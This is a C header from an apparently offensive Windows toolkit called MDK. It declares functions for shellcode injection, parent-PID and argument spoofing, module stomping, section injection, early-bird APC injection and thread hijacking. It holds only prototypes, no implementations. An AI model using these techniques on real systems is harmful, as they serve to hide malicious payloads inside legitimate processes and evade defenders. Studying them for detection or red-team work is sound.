// MDK
// docs    : https://sebafvs.com/mdk/execution
// author  : @sebafvs

#pragma once

#include <windows.h>
#include "result.h"


// --- Classic ---

MDK_RESULT mdk_classic     (IN HANDLE process, IN const BYTE* payload, IN SIZE_T size);
MDK_RESULT mdk_classic_rwx (IN HANDLE process, IN const BYTE* payload, IN SIZE_T size);


// --- Spawn ---

MDK_RESULT mdk_spawn_spoofed     (IN DWORD ppid, IN LPCSTR process_name, OUT DWORD* pid, OUT HANDLE* process, OUT HANDLE* thread);
MDK_RESULT mdk_spawn_arg_spoofed (IN LPCWSTR startup_args, IN LPCWSTR real_args, IN USHORT visible_length, OUT DWORD* pid, OUT HANDLE* process, OUT HANDLE* thread);


// --- Injection primitives ---

MDK_RESULT mdk_module_stomp   (IN const BYTE* payload, IN SIZE_T size, IN LPCWSTR dll_path, OUT HANDLE* thread);
MDK_RESULT mdk_section_inject (IN HANDLE process, IN const BYTE* payload, IN SIZE_T size, OUT HANDLE* out_thread);
MDK_RESULT mdk_early_bird_apc (IN PROCESS_INFORMATION pi, IN const BYTE* payload, IN SIZE_T size);
MDK_RESULT mdk_thread_hijack  (IN PROCESS_INFORMATION pi, IN const BYTE* payload, IN SIZE_T size);
